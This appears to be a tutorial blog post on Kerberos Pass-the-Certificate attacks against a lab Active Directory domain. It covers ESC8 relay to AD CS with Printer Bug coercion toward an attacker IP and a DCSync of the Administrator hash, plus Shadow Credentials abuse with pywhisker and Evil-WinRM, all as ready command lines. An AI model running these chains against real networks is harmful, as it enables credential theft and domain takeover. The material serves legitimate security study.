---
title: "Pass the Certificate"
date: 2026-08-07 10:00:00 -0300
categories: [Concepts, Windows]
tags: [windows, kerberos, pkinit, pass-the-certificate, esc8, shadow-credentials, pywhisker, ntlmrelayx, dcsync, pass-the-ticket, evil-winrm]
---

**PKINIT** (Public Key Cryptography for Initial Authentication) extends Kerberos to support public-key authentication, while **Pass-the-Certificate** uses X.509 certificates to obtain TGTs, commonly in **AD CS** and **Shadow Credentials** attacks.

## AD CS NTLM Relay Attack (ESC8)

**ESC8** is an **NTLM relay attack** against **AD CS Web Enrollment**, an HTTP-based certificate enrollment endpoint. By relaying a coerced account's NTLM authentication to this endpoint, an attacker can request a certificate on that account's behalf and later use it to obtain a Kerberos TGT through PKINIT. Tools such as **Impacket's `ntlmrelayx`** automate this by listening for incoming NTLM connections and forwarding them to the vulnerable enrollment endpoint.

```bash
impacket-ntlmrelayx -t http://<DOMAIN>/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

NTLM authentication attempts can be captured passively or actively coerced. One common method is the [Printer Bug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py), which abuses the **Print Spooler** service to force a machine account, such as a Domain Controller, to authenticate to an arbitrary host:

```bash
python3 printerbug.py INLANEFREIGHT.LOCAL/<USER>:"<PASSWORD>"@<DC_IP> <ATTACKER_IP>
```

Once the certificate for `DC01$` is obtained, `gettgtpkinit.py` uses it to perform **Pass-the-Certificate** and request a TGT for the domain controller's machine account:

```bash
python3 gettgtpkinit.py \
  -cert-pfx ../krbrelayx/DC01\$.pfx \
  -dc-ip <DC_IP> \
  'inlanefreight.local/dc01$' \
  /tmp/dc.ccache
```

Loading the resulting ccache file via `KRB5CCNAME` enables **Pass-the-Ticket** authentication:

```bash
export KRB5CCNAME=/tmp/dc.ccache
```

Because `DC01$` has sufficient privileges, the ticket can then be used to perform a **DCSync** attack and retrieve sensitive domain credentials, such as the NTLM hash of `Administrator`:

```bash
impacket-secretsdump \
  -k \
  -no-pass \
  -dc-ip <DC_IP> \
  -just-dc-user Administrator \
  'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
```

**Attack chain**: Coerced authentication (Printer Bug) → NTLM Relay (ESC8) → Certificate → PKINIT → TGT → Pass-the-Ticket → DCSync.

## Shadow Credentials (msDS-KeyCredentialLink)

**Shadow Credentials** abuses the `msDS-KeyCredentialLink` attribute in Active Directory, which stores public keys used for PKINIT authentication. An attacker with write access to this attribute on a target account — represented in BloodHound by the `AddKeyCredentialLink` edge — can add their own key material and effectively authenticate as that user.

Using `pywhisker`, the attacker generates an X.509 certificate and adds its public key to the target's `msDS-KeyCredentialLink`, producing a `.pfx` file that can be used for authentication:

```bash
pywhisker \
  --dc-ip <DC_IP> \
  -d INLANEFREIGHT.LOCAL \
  -u <USER> \
  -p '<PASSWORD>' \
  --target <TARGET_USER> \
  --action add
```

The generated PFX certificate is supplied to `gettgtpkinit.py` to obtain a TGT for the target account, which can then be loaded via `KRB5CCNAME` for Pass-the-Ticket, the same way as before:

```bash
python3 gettgtpkinit.py \
  -cert-pfx ../<CERT_FILE>.pfx \
  -pfx-pass '<PFX_PASSWORD>' \
  -dc-ip <DC_IP> \
  INLANEFREIGHT.LOCAL/<TARGET_USER> \
  /tmp/<TARGET_USER>.ccache
```

```bash
export KRB5CCNAME=/tmp/<TARGET_USER>.ccache
klist
```

If the target account has appropriate privileges, such as membership in **Remote Management Users**, the ticket can be used for Kerberos authentication through **Evil-WinRM**:

```bash
evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
```

**Attack chain**: Write access to `msDS-KeyCredentialLink` → Shadow Credentials → Certificate → PKINIT → TGT → Pass-the-Ticket → Access as the victim.